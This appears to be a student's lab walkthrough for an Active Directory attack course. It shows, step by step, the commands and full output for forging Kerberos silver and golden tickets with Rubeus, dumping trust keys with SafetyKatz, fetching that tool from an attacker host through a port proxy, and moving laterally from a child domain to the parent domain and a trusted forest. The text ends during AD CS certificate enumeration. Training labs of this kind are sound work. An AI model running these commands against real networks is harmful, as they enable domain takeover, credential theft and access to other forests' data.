![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:68d6c096c7cfee52a45d6207489526bc /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt`:
```
[SNIP]

[*] Action: Build TGS

[SNIP]

[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : 68D6C096C7CFEE52A45D6207489526BC
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 68D6C096C7CFEE52A45D6207489526BC
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : host📌
[*] Target         : dcorp-dc.dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'Administrator'🎭 to 'host📌/dcorp-dc.dollarcorp.moneycorp.local🏛️'

[*] AuthTime       : 2/14/2025 6:51:24 AM
[*] StartTime      : 2/14/2025 6:51:24 AM
[*] EndTime        : 2/14/2025 4:51:24 PM
[*] RenewTill      : 2/21/2025 6:51:24 AM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:1be12164a06b817e834eb437dc8f581c /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt`:
```
[SNIP]

[*] Action: Build TGS📌

[SNIP]

[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : 1BE12164A06B817E834EB437DC8F581C
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 1BE12164A06B817E834EB437DC8F581C
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : rpcss📌
[*] Target         : dcorp-dc.dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'Administrator'🎭 to 'rpcss📌/dcorp-dc.dollarcorp.moneycorp.local🏛️'

[*] AuthTime       : 2/14/2025 6:54:32 AM
[*] StartTime      : 2/14/2025 6:54:32 AM
[*] EndTime        : 2/14/2025 4:54:32 PM
[*] RenewTill      : 2/21/2025 6:54:32 AM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
Current LogonId is 0:0x38c010

Cached Tickets: (2)

#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: rpcss📌/dcorp-dc.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 2/14/2025 7:16:43 (local)
        End Time:   2/14/2025 17:16:43 (local)
        Renew Time: 2/21/2025 7:16:43 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:

#1>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: host📌/dcorp-dc.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 2/14/2025 7:16:16 (local)
        End Time:   2/14/2025 17:16:16 (local)
        Renew Time: 2/21/2025 7:16:16 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`gwmi -Class win32_operatingsystem -ComputerName 'dcorp-dc'`:
```
SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 20348
RegisteredUser  : Windows User
SerialNumber    : 00454-30000-00000-AA745
Version         : 10.0.20348
```
🚩

---

### Cross Trust Attacks

#### Cross Trust Attacks | Domains Trust Key Abuse (with Rubeus, SafetyKatz)

- **Access to the Child DC with DA Privileges**

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
```
[SNIP]

[*] Action: Ask TGT📌

[*] Got domain: dollarcorp.moneycorp.local
[*] Showing process : True
[*] Username        : PJAOM31O
[*] Domain          : 3OD40M7W
[*] Password        : 70VJ6MS5
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 6548
[+] LUID            : 0x31e0d34

[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[!] Pre-Authentication required!
[!]     AES256 Salt: DOLLARCORP.MONEYCORP.LOCALsvcadmin
[*] Using aes256_cts_hmac_sha1 hash: 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\svcadmin'
[*] Target LUID : 52301108
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[SNIP]

[*] Target LUID: 0x31e0d34
[+] Ticket successfully imported!🎟️

  ServiceName              :  krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL
  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL🏛️
  UserName                 :  svcadmin🎭 (NT_PRINCIPAL)
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  2/17/2025 5:25:33 AM
  EndTime                  :  2/17/2025 3:25:33 PM
  RenewTill                :  2/24/2025 5:25:33 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  BPP0XjHF4o/PmK//hy//KPO6mXvMd2bERUxH5SORqSg=
  ASREP (key)              :  6366243A657A4EA04E406F1ABC27F1ADA358CCD0138EC5CA2835067719DC7011
```

![New spawned terminal process](./assets/screenshots/learning_objective_18_new_spawned_terminal_process.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`klist`:
```
Current LogonId is 0:0x31e0d34

Cached Tickets: (1)

#0>     Client: svcadmin🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/17/2025 5:25:33 (local)
        End Time:   2/17/2025 15:25:33 (local)
        Renew Time: 2/24/2025 5:25:33 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y`:
```
Does \\dcorp-dc\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Loader.exe
1 File(s) copied
```

`winrs -r:dcorp-dc cmd`:
```
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Users\svcadmin>
```
🚀

![dcorp-dc | svcadmin](https://custom-icon-badges.demolab.com/badge/dcorp--dc-svcadmin-64b5f6?logo=windows11&logoColor=white)

`netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.22`

![HFS - SafetyKatz.exe](./assets/screenshots/learning_objective_18_hfs_safetykatz.png)

- **Extract from the Child DC the Trust Key for the Parent Domain**

`C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"`:
```
[SNIP]

mimikatz(commandline) # lsadump::evasive-trust /patch

Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-719815819-3726368948-3917688648📌)

Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-335606122-960912869-3279953914)
 [  In ]📌 DOLLARCORP.MONEYCORP.LOCAL🏛️ -> MONEYCORP.LOCAL🏛️
    * 2/5/2025 9:09:45 PM - CLEAR   - a4 f5 58 eb 73 17 cd b9 f7 17 c5 f1 79 cd 72 b9 23 ff 84 dc 0c 60 a0 53 51 fd 5b 72 86 97 f6 3e d8 39 9a b4 4f 9c 95 e8 e3 98 54 f7 54 97 28 31 8d 41 0a da 77 d8 fd 46 9e c1 77 22 7c 1f 67 99 43 9c 68 a7 00 1c cd d5 cf 60 33 7b 6b e7 23 dd 1e 64 d3 7b 88 c8 cf ea 05 0b a3 08 1c cc 13 aa ea 78 75 33 c5 20 f0 24 8a de 61 2b a7 91 39 9b 66 8a cd 04 6e 23 92 39 c1 22 7b 62 65 24 48 16 2c f2 02 15 6e 76 cc 3c 81 1b 86 2e 02 f7 1d 65 68 bf bd 6b 8c c5 d8 77 1e e2 19 be f7 34 c3 99 27 b1 7c bc 56 a2 75 a7 a7 57 c4 be 27 4b c2 7c f9 49 28 42 99 85 8b 1a 56 5c 27 85 9a 0d 17 d6 ea d4 07 ee 06 59 eb 25 65 59 c7 12 e9 11 be a1 ce 8f 95 4c 03 74 10 0d 92 ab 68 63 dd 15 87 07 6b 8c 92 51 f4 d1 2f f7 d2 e3 20 aa bd 43 68 a0
        * aes256_hmac       66a7798a2a045f5e7d429fee84d129659c0fa52a21e2782b14b4bc30909f0181
        * aes128_hmac       4bf553169dd3941e4c1a6a4a93120569
        * rc4_hmac_nt       d7dddee831c334082de7489882681b9c🔑

[SNIP]
```

- **Forge a Silver Ticket (with EA SID History) using the Trust Key from the Child DC for Privilege Escalation**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:d7dddee831c334082de7489882681b9c /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap`:
```
[SNIP]

[*] Action: Build TGS📌

[SNIP]

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL🏛️ (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648📌
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ExtraSIDs      : S-1-5-21-335606122-960912869-3279953914-519📌
[*] ServiceKey     : D7DDDEE831C334082DE7489882681B9C
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : D7DDDEE831C334082DE7489882681B9C
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt📌
[*] Target         : DOLLARCORP.MONEYCORP.LOCAL

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator🎭@dollarcorp.moneycorp.local🏛️'

[*] AuthTime       : 2/17/2025 5:41:25 AM
[*] StartTime      : 2/17/2025 5:41:25 AM
[*] EndTime        : 2/17/2025 3:41:25 PM
[*] RenewTill      : 2/24/2025 5:41:25 AM

[*] base64(ticket.kirbi):

doIGPjCCBjqgAwIBBaEDAgEWooIFCjCCBQZhggUCMIIE/qADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBKYwggSioAMCARehAwIBA6KCBJQEggSQF8F+37aU/wEWHfF5oIOvgKc5g8856XA6ZX0iSyUKFkhHnCARuI...

[SNIP]
```

- **Leverage the Forged Ticket to Gain EA Access to the Parent DC**

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:doIGPjCCBjqgAwIBBaEDAgEWooIFCjCCBQZhggUCMIIE/qADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBKYwggSioAMCARehAwIBA6KCBJQEggSQF8F+37aU/wEWHfF5oIOvgKc5g8856XA6ZX0iSyUKFkhHnCARuI...`:
```
[SNIP]

[*] Action: Ask TGS📌

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'http/mcorp-dc.MONEYCORP.LOCAL'
[*] Using domain controller: mcorp-dc.MONEYCORP.LOCAL (172.16.1.1)
[+] TGS request successful!
[+] Ticket successfully imported!🎟️
[*] base64(ticket.kirbi):

[SNIP]

  ServiceName              :  http📌/mcorp-dc.MONEYCORP.LOCAL
  ServiceRealm             :  MONEYCORP.LOCAL🏛️
  UserName                 :  Administrator🎭 (NT_PRINCIPAL)
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL🏛️
  StartTime                :  2/17/2025 5:43:28 AM
  EndTime                  :  2/17/2025 3:41:25 PM
  RenewTill                :  2/24/2025 5:41:25 AM
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  y+QNZ+j2Fg4W/dU+AXPehDw/MCQxVifb0NeFF/pcTbM=
```

- **Leverage the Forged Ticket to Gain EA Access to the Parent DC**

`klist`:
```
Current LogonId is 0:0x38c010

Cached Tickets: (1)

#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: http📌/mcorp-dc.MONEYCORP.LOCAL @ MONEYCORP.LOCAL🏛️
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 2/17/2025 5:43:28 (local)
        End Time:   2/17/2025 15:41:25 (local)
        Renew Time: 2/24/2025 5:41:25 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

`winrs -r:mcorp-dc.moneycorp.local cmd`:
```
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator.dcorp>
```
🚀

![mcorp-dc | administrator](https://custom-icon-badges.demolab.com/badge/mcorp--dc-administrator-64b5f6?logo=windows11&logoColor=white)

`set username`:
```
USERNAME=Administrator👑
```

`set computername`:
```
COMPUTERNAME=MCORP-DC🖥️
```
🚩

#### Cross Trust Attacks - Child `krbtgt` Key Hash Abuse

- **Forge a Golden Ticket (with EA SID History) using the `krbtgt` TGT Encryption Key Hash from the Child DC for Privilege Escalation**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt`:
```
[SNIP]

[*] Action: Build TGT📌

[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648📌
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-335606122-960912869-3279953914-519📌
[*] ServiceKey     : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt📌
[*] Target         : dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator🎭@dollarcorp.moneycorp.local🏛️'

[*] AuthTime       : 2/17/2025 5:53:23 AM
[*] StartTime      : 2/17/2025 5:53:23 AM
[*] EndTime        : 2/17/2025 3:53:23 PM
[*] RenewTill      : 2/24/2025 5:53:23 AM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
Current LogonId is 0:0x38c010

Cached Tickets: (1)

#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: krbtgt📌/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 2/17/2025 5:53:23 (local)
        End Time:   2/17/2025 15:53:23 (local)
        Renew Time: 2/24/2025 5:53:23 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

- **Leverage the Forged Ticket to Gain EA Access to the Parent DC**

`winrs -r:mcorp-dc.moneycorp.local cmd`:
```
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator.dcorp>
```
🚀

![mcorp-dc | administrator](https://custom-icon-badges.demolab.com/badge/mcorp--dc-administrator-64b5f6?logo=windows11&logoColor=white)

`set username`:
```
USERNAME=Administrator👑
```

`set computername`:
```
COMPUTERNAME=MCORP-DC🖥️
```
🚩

#### Cross Trust Attacks | Forests Trust Key Abuse (with Rubeus, SafetyKatz)

- **Access to the Forest 1 DC with DA Privileges**

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
```
[SNIP]

[*] Action: Ask TGT📌

[*] Got domain: dollarcorp.moneycorp.local
[*] Showing process : True
[*] Username        : OTIUTNAB
[*] Domain          : 1ZYFN9EA
[*] Password        : LYGECBLJ
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 5140
[+] LUID            : 0x3289056

[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[!] Pre-Authentication required!
[!]     AES256 Salt: DOLLARCORP.MONEYCORP.LOCALsvcadmin
[*] Using aes256_cts_hmac_sha1 hash: 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\svcadmin'
[*] Target LUID : 52990038
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[SNIP]

[*] Target LUID: 0x3289056
[+] Ticket successfully imported!🎟️

  ServiceName              :  krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL
  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL🏛️
  UserName                 :  svcadmin🎭 (NT_PRINCIPAL)
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  2/17/2025 6:28:33 AM
  EndTime                  :  2/17/2025 4:28:33 PM
  RenewTill                :  2/24/2025 6:28:33 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  KrFCwNEBLw07rNppG9eoRjor9CvHuEppOhkZS8GV0Tw=
  ASREP (key)              :  6366243A657A4EA04E406F1ABC27F1ADA358CCD0138EC5CA2835067719DC7011
```

![New spawned terminal process](./assets/screenshots/learning_objective_20_new_spawned_terminal_process.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`klist`:
```
Current LogonId is 0:0x3289056

Cached Tickets: (1)

#0>     Client: svcadmin🎭 @ DOLLARCORP.MONEYCORP.LOCAL
        Server: krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/17/2025 6:28:33 (local)
        End Time:   2/17/2025 16:28:33 (local)
        Renew Time: 2/24/2025 6:28:33 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y`:
```
C:\AD\Tools\Loader.exe
1 File(s) copied
```

`winrs -r:dcorp-dc cmd`:
```
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Users\svcadmin>
```
🚀

![dcorp-dc | svcadmin](https://custom-icon-badges.demolab.com/badge/dcorp--dc-svcadmin-64b5f6?logo=windows11&logoColor=white)

`netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.22`

![HFS - SafetyKatz.exe](./assets/screenshots/learning_objective_20_hfs_safetykatz.png)

- **Extract from the Forest 1 DC the Trust Key for the Forest 2**

`C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"`:
```
[SNIP]

mimikatz(commandline) # lsadump::evasive-trust /patch📌

Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-719815819-3726368948-3917688648)

[SNIP]

Domain: EUROCORP.LOCAL🏛️ (ecorp / S-1-5-21-3333069040-3914854601-3606488808)
 [  In ]📌 DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL🏛️
    * 2/16/2025 9:16:51 PM - CLEAR   - 14 fd 45 3b db 06 1d cf 60 b1 6c 8f 7f 73 48 65 00 f9 64 2b 24 fe a5 8e 87 64 37 77
        * aes256_hmac       58d399736f8be2c9efa51372ffd06ba9e5c36afd97a9161ea4bafc5d0f1dce8b
        * aes128_hmac       80d9ea04b9e7031892cc39335a390883
        * rc4_hmac_nt       8b47def37766600c86a9ce817a3fadf4🔑

[SNIP]
```

- **Forge a Silver Ticket (without EA SID History) using the Trust Key from the Forest 1 DC for Access to the Shared Resources of the Forest 2 DC**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:8b47def37766600c86a9ce817a3fadf4 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap`:
```
[SNIP]

[*] Action: Build TGS📌

[SNIP]

[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL🏛️ (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648📌
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : 8B47DEF37766600C86A9CE817A3FADF4
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 8B47DEF37766600C86A9CE817A3FADF4
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt📌
[*] Target         : DOLLARCORP.MONEYCORP.LOCAL

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator🎭@dollarcorp.moneycorp.local🏛️'

[*] AuthTime       : 2/17/2025 6:39:56 AM
[*] StartTime      : 2/17/2025 6:39:56 AM
[*] EndTime        : 2/17/2025 4:39:56 PM
[*] RenewTill      : 2/24/2025 6:39:56 AM

[*] base64(ticket.kirbi):

doIGFjCCBhKgAwIBBaEDAgEWooIE4jCCBN5hggTaMIIE1qADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBH4wggR6oAMCARehAwIBA6KCBGwEggRoE9cWBih+LxGKDixqdOmGHhJwLIgfqN7ZSjyj6LJBgqICEUeFON...
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:doIGFjCCBhKgAwIBBaEDAgEWooIE4jCCBN5hggTaMIIE1qADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBH4wggR6oAMCARehAwIBA6KCBGwEggRoE9cWBih+LxGKDixqdOmGHhJwLIgfqN7ZSjyj6LJBgqICEUeFON...`:
```
[SNIP]

[*] Action: Ask TGS📌

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'cifs/eurocorp-dc.eurocorp.LOCAL'
[*] Using domain controller: eurocorp-dc.eurocorp.LOCAL (172.16.15.1)
[+] TGS request successful!
[+] Ticket successfully imported!🎟️
[*] base64(ticket.kirbi):

  ServiceName              :  cifs📌/eurocorp-dc.eurocorp.LOCAL
  ServiceRealm             :  EUROCORP.LOCAL🏛️
  UserName                 :  Administrator🎭 (NT_PRINCIPAL)
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL🏛️
  StartTime                :  2/17/2025 6:41:55 AM
  EndTime                  :  2/17/2025 4:39:56 PM
  RenewTill                :  2/24/2025 6:39:56 AM
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  Nk2XyKZnkKBktXbXGZa0JWGTRWe39S4JumkWhRlUqrI=
```

`klist`:
```
Current LogonId is 0:0x38c010

Cached Tickets: (1)

#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: cifs📌/eurocorp-dc.eurocorp.LOCAL @ EUROCORP.LOCAL🏛️
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 2/17/2025 6:41:55 (local)
        End Time:   2/17/2025 16:39:56 (local)
        Renew Time: 2/24/2025 6:39:56 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

- **Leverage the Forged Ticket to Gain Access to the Shared Resources of the Forest 2 DC**

`dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\`:
```
 Volume in drive \\eurocorp-dc.eurocorp.local\SharedwithDCorp has no label.
 Volume Serial Number is 1A5A-FDE2

 Directory of \\eurocorp-dc.eurocorp.local\SharedwithDCorp📁

11/16/2022  04:26 AM    <DIR>          .
11/15/2022  06:17 AM                29 secret.txt
               1 File(s)             29 bytes
               1 Dir(s)   7,438,217,216 bytes free
```

`type \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt`:
```
Dollarcorp DAs can read this!📌
```
🚩

#### Cross Trust Attacks | AD CS Abuse - ESC1 + ESC3 (with Certify, Rubeus)

- **Find ESC1 Vulnerable Certificate Templates**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Certify.exe cas`:
```
   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate authorities📌
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'


[*] Root CAs

    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA🏛️, DC=moneycorp, DC=local
